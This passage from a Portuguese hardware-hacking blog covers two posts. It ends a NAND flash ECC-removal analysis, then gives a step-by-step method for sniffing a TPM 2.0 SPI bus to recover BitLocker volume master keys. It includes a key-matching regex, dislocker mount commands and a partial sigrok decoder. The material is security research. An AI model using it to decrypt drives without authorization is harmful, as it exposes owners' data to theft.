<p>Com os dados agora limpos, a próxima etapa é identificar os arquivos presentes para verificar a eficácia da nossa suposição. Uma olhada rápida na lista de arquivos destacados pelo <em>binwalk</em> nos fornecerá uma indicação.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk F59L1G81MA@BGA63_1111.BIN

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
438548        0x6B114         Base64 standard index table
439650        0x6B562         DES PC1 table
439738        0x6B5BA         DES PC2 table
440945        0x6BA71         DES SP2, little endian
441738        0x6BD8A         DES SP1, little endian
477666        0x749E2         Certificate <span class="k">in </span>DER format <span class="o">(</span>x509 v3<span class="o">)</span>, header <span class="o">(</span>...<span class="o">)</span>
478540        0x74D4C         Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
479065        0x74F59         Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
1384724       0x152114        Base64 standard index table
1385826       0x152562        DES PC1 table
1385914       0x1525BA        DES PC2 table
1387121       0x152A71        DES SP2, little endian
1387914       0x152D8A        DES SP1, little endian
1423842       0x15B9E2        Certificate <span class="k">in </span>DER format <span class="o">(</span>x509 v3<span class="o">)</span>, header <span class="o">(</span>...<span class="o">)</span>
1424716       0x15BD4C        Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
1425241       0x15BF59        Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
7839754       0x77A00A        uImage header, header size: 64 bytes, header <span class="o">(</span>...<span class="o">)</span>
7839818       0x77A04A        Linux kernel ARM boot executable zImage <span class="o">(</span>litt<span class="o">(</span>...<span class="o">)</span>
7857081       0x77E3B9        <span class="nb">gzip </span>compressed data, maximum compression,   <span class="o">(</span>...<span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>
</code></pre></div></div>

<p>Podemos identificar um <em>bitmap</em> logo no começo da imagem, onde o <em>binwalk</em> consegue inclusive identificar o tamanho e profundidade de bits dele:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
</code></pre></div></div>

<p>Uma característica marcante dos <em>bitmaps</em> é a forma como armazenam informações de cores. Os bytes no arquivo mapeiam diretamente para as cores da imagem. Assim, quando temos uma região da imagem que apresenta uma única cor, essa cor é representada por sequências consecutivas de bytes idênticos no arquivo. Essa propriedade é especialmente útil quando tentamos discernir a distribuição dos bits de correção de erro (ECC). Se um segmento do bitmap, que se ajusta a uma página de memória, exibe a mesma cor que outro segmento em uma página diferente, é esperado que seus bits de ECC correspondentes sejam idênticos.</p>

<p>Considerando que a imagem identificada possui uma profundidade de cor de 24 bpp (bits por pixel), cada pixel é representado por 3 bytes. Dada a capacidade de uma página de memória ser de 2048 bytes, isso se traduz em cerca de 682 pixels por página. Isso é ligeiramente mais do que duas linhas da imagem. A tentativa de acessar o <em>bitmap</em> na sua forma atual sugere inconsistências, o que nos leva a questionar nossas suposições iniciais sobre a distribuição dos bits de ECC.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/pax-broken.jpg" alt="Logotipo corrompido da PAX" /><em>Logotipo corrompido da PAX</em></p>

<p>Para uma interpretação adequada, é vital extrair várias páginas da memória contendo os dados do bitmap de forma alinhada. Dessa forma, podemos ter certeza de que a cada intervalo de 2112 bytes, estamos lidando com uma nova página, e não uma continuação da anterior. Posteriormente, podemos utilizar um software de edição de imagem que permita manipular imagens em formatos “RAW” arbitrários. Neste contexto, utilizaremos o GIMP para analisar os dados crus da imagem. Uma das vantagens do GIMP é a flexibilidade em definir a geometria da imagem e a formatação dos pixels.</p>

<p>Para facilitar a identificação dos bits de ECC, definiremos a largura da imagem como 2112, correspondendo ao tamanho da página de memória. Isso permitirá visualizar cada página de memória como uma linha distinta. Vamos escolher uma representação de 8 bits por pixel, em tom monocromático, para garantir uma correspondência exata de 2112 bytes por linha. Em relação à altura, optaremos por, no mínimo, 100 linhas, de modo a proporcionar uma visão clara das variações entre as diferentes páginas de memória.</p>

<p>Ao examinar a representação visual fornecida pelo GIMP, notamos segmentos claramente definidos de 512 bytes dentro de cada página de memória. Esses segmentos são intercalados com colunas mais finas, cuja aparência parece diretamente influenciada pelo bloco adjacente.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis.jpg" alt="Blocos de 512 bytes" /><em>Blocos de 512 bytes</em></p>

<p>Observando mais atentamente, percebemos que as linhas completamente pretas apresentam uma coluna com padrões consistentes à esquerda da marcação de 512 bytes. Contrapondo-se a isso, linhas que exibem alguma variação também manifestam discrepâncias nessa mesma coluna à esquerda. Com base nessa observação, podemos inferir que as colunas posicionadas tanto à esquerda quanto à direita do segmento de 512 bytes representam, de fato, dados de paridade, e não são parte intrínseca do bitmap. Isso se torna ainda mais evidente considerando que as primeiras linhas do bitmap são inteiramente pretas.</p>

<p>Ao considerar a página de memória em sua totalidade, outro detalhe se destaca: apesar do padrão observado, há uma coluna completamente branca em uma posição inesperada. Além disso, a primeira coluna, que teoricamente deveria ser branca, parece estar deslocada ou alterada de alguma forma.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis-1.png" alt="Coluna aparentemente trocada de lugar" /><em>Coluna aparentemente trocada de lugar</em></p>

<p>A hipótese levantada sugere que, por alguma razão, essas colunas podem ter sido trocadas de lugar durante o processo de dispersão. Para validar essa suposição, uma abordagem prática seria utilizar o próprio GIMP para reposicionar a coluna e avaliar se o conteúdo resultante se alinha de forma harmoniosa com o restante da página de memória.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis-3.png" alt="Trocando colunas identificadas de local" /><em>Trocando colunas identificadas de local</em></p>

<p>A imagem acima valida nossa conjectura, destacando que a realocação das colunas proporciona uma visualização mais coerente do conteúdo. Embora pareça incomum à primeira vista, considerando a natureza de segurança do dispositivo, é plausível pensar que essa disposição alterada possa ser uma forma deliberada de esconder dados. Essa peculiaridade não é mencionada em nenhuma documentação pública disponível para o processador do dispositivo.</p>

<p>Com base nessas descobertas, temos as ferramentas necessárias para aprimorar nosso script em Python, visando eliminar os bits de paridade e rearranjar os segmentos de 512 bytes, com o objetivo de obter uma imagem refinada e coerente.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">F59L1G81MA@BGA63_1111.BIN</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">o</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">FIXEDDATA.bin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pagesToRead</span> <span class="o">=</span> <span class="mi">65536</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">pagesToRead</span><span class="p">):</span>
  <span class="n">page</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">2112</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">page</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">535</span><span class="p">:</span><span class="mi">535</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">1060</span><span class="p">:</span><span class="mi">1060</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">1585</span><span class="p">:</span><span class="mi">1585</span><span class="o">+</span><span class="mi">512</span><span class="p">])</span>
  <span class="n">data</span><span class="p">[</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="mi">48</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">page</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
  <span class="n">o</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">o</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Após todos os passos de análise e correção, conseguimos extrair o <em>bitmap</em> e validar que todas as nossas hipóteses e métodos de análise estavam corretos:
<img src="/assets/posts/analise-e-decodificacao-flash/pax-fixed.jpg" alt="Logotipo &quot;ajustado&quot; da PAX" /><em>Logotipo “ajustado” da PAX</em></p>

<h2 id="conclusão">Conclusão</h2>

<p>É essencial destacar que nossa abordagem se limitou a <strong>remover</strong> os bits de paridade, sem aplicar de fato o algoritmo de correção de erros. Como mencionado anteriormente, as memórias flash, particularmente as do tipo NAND, podem apresentar bits defeituosos, inclusive desde sua fabricação. A omissão do algoritmo de ECC específico pode resultar em inconsistências nos dados finais.</p>

<p>Por sorte, o conteúdo deste dispositivo específico <strong>não</strong> estava criptografado, o que nos facilitou na análise de dispersão, aproveitando-se apenas de um conteúdo conhecido. Se o conteúdo estivesse criptografado, seria essencial identificar um padrão recorrente (como páginas de memória vazias) onde a informação de ECC estaria gravada.</p>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="NAND" /><category term="PAX" /><category term="RT809H" /><summary type="html"><![CDATA[Explorando memorias NAND]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TPM 2.0: Extrair chaves do Bitlocker por SPI</title><link href="https://lucasteske.dev/pt/2024/01/tpm-2-extraindo-chaves-bitlocker" rel="alternate" type="text/html" title="TPM 2.0: Extrair chaves do Bitlocker por SPI" /><published>2024-01-16T23:48:00+00:00</published><updated>2024-01-16T23:48:00+00:00</updated><id>https://lucasteske.dev/pt/2024/01/tpm-2-extraindo-chaves-bitlocker</id><content type="html" xml:base="https://lucasteske.dev/pt/2024/01/tpm-2-extraindo-chaves-bitlocker"><![CDATA[<p>O TPM 2.0, também conhecido como Trusted Platform Module 2.0, é um recurso de segurança de hardware que está incorporado em muitos computadores modernos. Sua finalidade é proporcionar uma maneira segura de armazenar chaves criptográficas e outros dados sensíveis, tais como senhas e certificados digitais, visando proteger contra diversas ameaças de segurança, incluindo acesso não autorizado ao hardware e software de um computador. O TPM 2.0 representa uma evolução da especificação original do TPM, desenvolvida pelo Trusted Computing Group (TCG), e apresenta recursos e capacidades adicionais, como suporte a algoritmos criptográficos adicionais e a capacidade de armazenar quantidades maiores de dados.</p>

<h3 id="coisas-boas">Coisas boas</h3>

<p>Atualmente, o Trusted Platform Module (TPM) é amplamente utilizado por mecanismos de criptografia de disco completo (Full Disk Encryption - FDE) e também por criptografia específica do dispositivo, já que geralmente está vinculado ao dispositivo (soldado na placa-mãe).</p>

<p>É notável que, além de ser um recurso de segurança avançado em máquinas modernas, o protocolo de comunicação utilizado pelos Integrated Circuits (ICs) TPM é bastante simples. Geralmente, os ICs TPM utilizam o protocolo de comunicação Serial Peripheral Interface (SPI), mas também podem utilizar o protocolo Low Pin Count (LPC) e o protocolo Inter-Integrated Circuit (I2C). Uma questão importante a ser levantada é que os usuários geralmente confiam no TPM como uma medida de segurança confiável, no entanto, o tráfego no barramento geralmente é transmitido em texto simples. Por exemplo, após o desbloqueio do TPM, a chave do Bitlocker do Windows é transmitida em texto simples no barramento.</p>

<p>Para este artigo, as suposições e análises são baseadas na especificação 2.0, versão 1.03v22 do TPM (na data do artigo atual, a especificação mais utilizada em computadores domésticos e servidores), que está disponível aqui: <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>

<p>Além disso, é importante mencionar que este artigo se baseia em outros dois artigos, que podem ser encontrados nos seguintes links:</p>

<p><a href="https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key">https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key</a></p>

<p><a href="https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network">https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network</a></p>

<p>Cabe ressaltar que até o presente momento, o conhecimento aplicado com sucesso permitiu a extração de uma chave do Bitlocker em um cenário real.</p>

<h3 id="transação-spi-do-tpm">Transação SPI do TPM</h3>

<p>Uma transação do Trusted Platform Module (TPM) por meio do protocolo Serial Peripheral Interface (SPI) é uma série de operações executadas por um dispositivo TPM. Essas operações incluem, normalmente, a inicialização do TPM, a criação e gerenciamento de chaves criptográficas e a execução de operações criptográficas, como criptografia e assinatura.</p>

<p>Um exemplo comum de uso do TPM é proteger as chaves de criptografia de um sistema, permitindo que o sistema seja iniciado somente se o TPM permitir após uma série de verificações de segurança. Outro exemplo é criar uma conexão segura com outro dispositivo, criando um par de chaves exclusivo, armazenando a chave privada no TPM e compartilhando a chave pública com o outro dispositivo.</p>

<p>As transações do dispositivo TPM são normalmente executadas interagindo com um driver de dispositivo TPM, que é um software que se comunica com o dispositivo TPM e gerencia suas operações. As transações do dispositivo TPM são normalmente governadas pela Application Programming Interface (API) da biblioteca TPM2.0.</p>

<p>Existem vários tipos de transações que podem ser analisados por meio do SPI, porém, para o propósito de recuperar as chaves do Bitlocker, apenas dois são relevantes: FIFO Write e FIFO Read. O foco nessas duas operações é necessário para acessar a chave Volume Master Key (VMK), que é responsável por criptografar a chave AES256-XTS.</p>

<p>A VMK é criptografada pelo TPM e armazenada no cabeçalho Bitlocker do disco de destino. Durante o processo de inicialização, o carregador de inicialização do Windows recupera a VMK criptografada do cabeçalho Bitlocker e envia-a para o TPM como uma solicitação de descriptografia. O TPM, então, envia de volta a versão descriptografada da VMK, assumindo que o TPM está configurado corretamente e todas as verificações de segurança foram aprovadas. O resultado do processo de descriptografia depende da configuração do TPM.</p>

<p>Em sistemas com inicialização segura completa, o TPM exige que múltiplos hashes sejam corretamente inicializados durante as primeiras etapas do processo de inicialização. Os detalhes específicos desse processo estão fora do escopo desta explicação, mas é importante observar que cada etapa do processo de inicialização do sistema faz um hash da próxima etapa e carrega-o no TPM. Por exemplo, a primeira etapa é um bootrom dentro da CPU que verifica a assinatura da primeira etapa do BIOS.</p>

<h3 id="interceptando-o-tpm">Interceptando o TPM</h3>

<p>O chip Trusted Platform Module (TPM) geralmente está localizado na placa-mãe de uma forma que não é facilmente acessível, por exemplo, no lado do teclado de um laptop. No entanto, como o protocolo Serial Peripheral Interface (SPI) é um protocolo de barramento, é possível inferir que todos os dispositivos SPI na placa-mãe utilizem as mesmas linhas de clock e dados. Como resultado, é possível conectar um analisador lógico à memória flash SPI que armazena o código BIOS/UEFI e monitorar quaisquer transações SPI que ocorram quando a memória flash estiver inativa (quando o sinal de seleção do chip para a memória flash estiver baixo). Essa abordagem permite detectar as transações relevantes para recuperar as chaves do Bitlocker.
<img src="/assets/posts/patreon/Pasted image 20230124034954.png" alt="" />
<img src="/assets/posts/patreon/Pasted image 20230124035004.png" alt="" /></p>

<p>Este método, no entanto, pode levar a complicações potenciais se houver outros dispositivos conectados ao mesmo barramento SPI, além da memória flash SPI e do TPM. Embora seja relativamente improvável que vários dispositivos estejam conectados ao mesmo barramento nesse contexto.</p>

<p>No pulseview, podemos analisar os bytes SPI usando a função decodificadora de SPI.
<img src="/assets/posts/patreon/Pasted image 20230124035010.png" alt="" />
<img src="/assets/posts/patreon/Pasted image 20230124035020.png" alt="" /></p>

<p>Em seguida, precisamos configurar o decodificador SPI para os sinais corretos para poder ver os bytes decodificados.
<img src="/assets/posts/patreon/Pasted image 20230124035029.png" alt="" /></p>

<p>Então, você notará que, como deixamos o campo de polaridade do CS# como “<strong>active-low</strong>”, ele está decodificando apenas as transações do BIOS Flash, não o “resto” do barramento.
<img src="/assets/posts/patreon/Pasted image 20230124035036.png" alt="" /></p>

<p>Se selecionarmos “<strong>active-high</strong>”, analisaremos qualquer coisa que <strong>não</strong> seja o BIOS flash (que é o que queremos):
<img src="/assets/posts/patreon/Pasted image 20230124035040.png" alt="" /></p>

<p>Agora temos bytes analisados para o SPI, o que torna mais fácil para nós trabalharmos com eles. Agora precisamos criar um plugin do sigrok para analisá-lo.</p>

<h3 id="analisando-o-tpm-no-sigrok--pulseview">Analisando o TPM no Sigrok / Pulseview</h3>

<p>A criação de um plugin Sigrok é um processo simples, graças ao guia oficial detalhado disponível no site do Sigrok em <a href="https://sigrok.org/wiki/Protocol_decoder_HOWTO">https://sigrok.org/wiki/Protocol_decoder_HOWTO</a>. Dado que estamos trabalhando com o protocolo Serial Peripheral Interface (SPI), é adequado utilizar a funcionalidade “Decodificador de Pilha” do Sigrok, que permite encadear vários decodificadores e usar a saída de um decodificador como entrada de outro. Essa abordagem simplifica o processo, eliminando a necessidade de localizar e extrair manualmente bits individuais de dados dos dados brutos do SPI e permite que o foco seja nos bytes formados reais produzidos pelo decodificador SPI do Sigrok.</p>

<p>Para começar, é necessário criar uma pasta “tpmdecoder” na pasta de plugins (no Linux, ela está localizada em ~/.local/share/libsigrokdecode/decoders/), com os seguintes arquivos anexados a esta postagem:</p>

<ul>
  <li><strong>init</strong>.py</li>
  <li>pd.py</li>
</ul>

<p>Esses são os arquivos necessários para o decodificador que foi desenvolvido. Basicamente, foi criado um decodificador para os registradores TPM, conforme descrito em <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>

<p>Após criar e salvar o projeto do PulseView, é necessário fechar e abrir novamente. O plugin deve ser carregado automaticamente. Na configuração do plugin SPI, na opção “Decodificador de Pilha”, a opção “TPM2.0” deverá estar disponível.
<img src="/assets/posts/patreon/Pasted image 20230124035119.png" alt="" />
E depois de selecionar, ele começará a tentar encontrar mensagens TPM2.0 sobre os dados SPI. <img src="/assets/posts/patreon/Pasted image 20230124035129.png" alt="" /></p>

<h3 id="chave-do-bitlocker">Chave do Bitlocker</h3>

<p>Para esta seção, é altamente recomendável verificar a documentação do <a href="https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc">libbde</a> no GitHub. A documentação contém praticamente todas (se não todas) as informações relacionadas ao Bitlocker, incluindo as versões legadas.</p>

<p>A chave que desejamos recuperar é, na verdade, a chave mestra de volume do Bitlocker, que possui um formato específico. Podemos usar uma expressão regular para recuperar essa chave em vez de tentar entender cada solicitação, o que levaria mais tempo para criar um decodificador.</p>

<p>Os dados que são realmente criptografados pelo TPM são uma entrada de metadados FVE, como descrito na seção <a href="https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc#53-fve-metadata-entry">5.3 do libbde</a>. Isso apresenta alguns cabeçalhos que podem ser combinados com uma expressão regular.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})
</code></pre></div></div>

<p>Depois de todo o cabeçalho, a chave Volume Master Key (VMK) é concatenada. Para encontrar a chave, basta procurar por 64 caracteres (32 bytes, o que corresponde a uma chave de 256 bits).</p>

<p>Para facilitar o uso, o decodificador anexado imprime as chaves encontradas no terminal de decodificação (para que não seja necessário usar a interface do PulseView, se não desejado) e também mostra em uma linha separada no PulseView.
<img src="/assets/posts/patreon/Pasted image 20230124035206.png" alt="" /></p>

<h3 id="acessando-dados-usando-o-vmk-descarregado">Acessando dados usando o VMK descarregado</h3>

<p>Para acessar os dados criptografados pelo Bitlocker, utilizaremos o projeto dislocker (<a href="https://github.com/Aorimn/dislocker">https://github.com/Aorimn/dislocker</a>) para montar a partição como texto simples. Antes disso, é necessário salvar a chave inteira como um arquivo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"66D96600C7..."</span> | xxd <span class="nt">-p</span> <span class="nt">-r</span> <span class="o">&gt;</span> vmk.key
</code></pre></div></div>

<p>Em seguida, podemos utilizar o dislocker para criar um nó de dispositivo com o dispositivo em texto simples, usando a partição n em sdx:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">mkdir</span> <span class="nt">-p</span> mydisk <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>dislocker-fuse <span class="nt">-K</span> vmk.key /dev/sdxn <span class="nt">--</span> ./mydisk
</code></pre></div></div>

<p>Por exemplo, se a partição criptografada estiver em /dev/sda3, pode-se utilizar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> mydisk <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>dislocker-fuse <span class="nt">-K</span> vmk.key /dev/sda3 <span class="nt">--</span> ./mydisk
</code></pre></div></div>

<p>Será criado um arquivo dislocker dentro da pasta ./mydisk, que representa o dispositivo e pode ser montado como uma partição normal.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>mount <span class="nt">-o</span> remove_hiberfile ./mydisk/dislocker-file /media/disk
</code></pre></div></div>

<p>Agora, é possível acessar os dados descriptografados na pasta /media/disk.</p>

<h3 id="todas-referências-consolidadas">Todas referências consolidadas</h3>

<p>Aqui estão todas as referências consolidadas para que possam checar elas.</p>

<ul>
  <li>
    <p>TPM 2.0 Specification - <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>
  </li>
  <li>
    <p>F-Secure - Sniff, there leaks - <a href="https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key">https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key</a></p>
  </li>
  <li>
    <p>DolosGroup - From Stolen Laptop to Inside the company network - <a href="https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network">https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network</a></p>
  </li>
</ul>

<h1 id="arquivos">Arquivos</h1>

<h3 id="__init__py"><code class="language-plaintext highlighter-rouge">__init__.py</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##
## This file is part of the libsigrokdecode project.
##
## Copyright (C) 2022 Lucas Teske &lt;lucas@teske.com.br&gt;
##
## This program is free software; you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation; either version 2 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
##
</span>
<span class="kn">from</span> <span class="n">.pd</span> <span class="kn">import</span> <span class="n">Decoder</span>
</code></pre></div></div>

<h3 id="pdpy"><code class="language-plaintext highlighter-rouge">pd.py</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##
## This file is part of the libsigrokdecode project.
##
## Copyright (C) 2022 Lucas Teske &lt;lucas@teske.com.br&gt;
##
## This program is free software; you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation; either version 2 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
##
</span>
<span class="kn">import</span> <span class="n">sigrokdecode</span> <span class="k">as</span> <span class="n">srd</span>
<span class="kn">import</span> <span class="n">binascii</span><span class="p">,</span> <span class="n">re</span>
<span class="kn">from</span> <span class="n">enum</span> <span class="kn">import</span> <span class="n">Enum</span>

<span class="n">OPERATION_MASK</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">SIZE_MASK</span> <span class="o">=</span> <span class="mh">0x3f</span>
<span class="n">WAIT_MASK</span> <span class="o">=</span> <span class="mh">0x01</span>

<span class="c1"># Registers at https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf
# Page 63 (pdf 71) - Table 17
</span>
<span class="n">tpmRegisters</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0xD40000</span><span class="p">:</span> <span class="sh">"</span><span class="s">TPM_ACCESS_0</span><span class="sh">"</span><span class="p">,</span>
    <span class="mh">0xD4000C</span><span class="p">:</span> <span class="sh">"</span><span class="s">TPM_INT_VECTOR_0</span><span class="sh">"</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40008</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INT_ENABLE_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40010</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INT_STATUS_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40014</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INTF_CAPABILITY_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40018</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_STS_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40024</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_DATA_FIFO_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40030</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INTERFACE_ID_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40080</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_XDATA_FIFO_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40F00</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_DID_VID_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tpmRegisters</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">{:08X} = {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tpmRegisters</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>

